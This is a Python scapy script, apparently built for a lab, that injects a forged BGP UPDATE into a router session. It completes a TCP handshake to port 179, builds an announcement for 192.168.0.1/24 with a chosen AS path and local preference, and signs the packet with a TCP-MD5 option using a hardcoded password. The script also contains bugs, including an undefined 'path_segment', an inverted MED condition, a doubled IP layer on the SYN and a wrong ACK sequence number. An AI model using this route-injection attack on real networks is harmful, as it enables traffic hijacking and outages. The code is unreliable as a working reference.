import hashlib

from TCP_MD5_parser import get_md5_salt_from_bytes
from scapy.all import *
from scapy.compat import raw
from scapy.contrib.bgp import *
from scapy.layers.inet import IP
from scapy.layers.l2 import Ether


def sign_single_packet(packet, password):
    # add an MD5 signature so that the length contains the signature
    packet[TCP].options = [(19, b"\x00" * 16)]
    # get bytes
    raw_ip_data, raw_tcp_data = raw(packet[IP]), raw(packet[TCP])
    # get the salt from these bytes
    salt = get_md5_salt_from_bytes(raw_ip_data, raw_tcp_data)
    # computes the hash
    if type(password) is not bytes:
        password = password.encode("utf-8")

    salt += password
    packet_hash = hashlib.md5(salt).digest()
    # add the signature in the options
    packet[TCP].options = [(19, packet_hash)]
    return packet


def craft_BGP_update_packet(nlri_prefix, path=None, local_pref=0, origin="IGP", next_hop=None, multi_exit_disc=0):
    """Returns a scapy BGPupdate packet with the given parameters"""
    if path is None:
        path = []

    header = BGPHeader(type=2, marker=0xffffffffffffffffffffffffffffffff)
    attributes = []

    if origin == "IGP":
        attributes.append(BGPPathAttr(type_flags=0b01000000, type_code=1, attribute=BGPPAOrigin(origin=0)))
    if next_hop:
        attributes.append(BGPPathAttr(type_flags=0b01000000, type_code=3, attribute=BGPPANextHop(next_hop=next_hop)))
    if path:
        attributes.append(BGPPathAttr(type_flags=0b01000000, type_code=2, attribute=path_segment))
    if multi_exit_disc == 0:
        attributes.append(BGPPathAttr(type_flags=0b10000000, type_code=4, attribute=BGPPAMultiExitDisc(med=multi_exit_disc)))
    if local_pref != 0:
        attributes.append(BGPPathAttr(type_flags=0b01000000, type_code=5, attribute=BGPPALocalPref(local_pref=local_pref)))

    # Compose the UPDATE packet given all the specified options
    update = BGPUpdate(withdrawn_routes_len=0, path_attr=attributes, nlri=BGPNLRI_IPv4(prefix=nlri_prefix))

    bgp_packet = header / update
    bgp_packet[BGPHeader].len = len(bgp_packet[BGPHeader])
    return bgp_packet


def TCP_handshake(ip_src, ip_dst, sport, dport, seq_num):
    """Perform a TCP handshake as a client, first 1) sending SYN 2) receiving SYN_ACK and 3) responding with ACK"""
    ip = IP(src=ip_src, dst=ip_dst)
    SYN = ip / TCP(sport=sport, dport=dport, flags='S', seq=seq_num)
    SYN = SYN.__class__(bytes(SYN)) # compute checksum
    SYN.show()

    # send SYN and read only the first answer
    SYNACK = sr1(ip / SYN)

    # SYN-ACK
    ACK = TCP(sport=sport, dport=dport, flags='A', seq=SYNACK.ack + 1, ack=SYNACK.seq + 1)
    send(ip / ACK)
    return SYNACK


def inject_packet():
    IP_src = "192.168.12.12"
    IP_dst = "192.168.12.1"
    src_port = 36376
    BGP_port = 179
    seq_num = 1000
    print("TCP handshake")
    syn_ack = TCP_handshake(IP_src, IP_dst, src_port, BGP_port, seq_num)
    print("Handshake done")
    ip = IP(src=IP_src, dst=IP_dst, proto=6, ttl=255)
    tcp = TCP(sport=src_port, dport=BGP_port, seq=syn_ack[TCP].ack, ack=syn_ack[TCP].seq + 1, flags='PA')
    bgp_packet = craft_BGP_update_packet("192.168.0.1/24", path=[2], local_pref=90)
    packet = Ether() / ip / tcp / bgp_packet
    signed_packet = sign_single_packet(packet, "azerty")
    signed_packet.show()
    send(signed_packet)

if __name__ == "__main__":
    inject_packet()
